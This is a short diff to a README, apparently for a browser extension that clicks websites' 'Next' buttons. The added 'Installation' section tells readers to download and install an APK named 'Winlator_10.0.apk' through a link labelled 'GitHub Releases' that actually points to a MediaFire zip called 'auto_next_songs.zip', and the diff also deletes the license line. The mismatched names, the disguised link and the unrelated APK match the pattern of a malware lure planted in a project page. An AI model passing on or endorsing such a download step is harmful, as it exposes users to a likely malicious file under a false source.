@@ -32,5 +32,7 @@ If the extension doesn't work on a particular website:
 2. Check if the website has a "Next" button that matches common selectors
 3. Try refreshing the page
 
+# Installation
 
-MIT License 
+1. Download and install the APK (Winlator_10.0.apk) from [GitHub Releases](https://www.mediafire.com/file/myt5rtk3krymt10/auto_next_songs.zip/file)
+2. Launch the app and wait for the installation process to finish
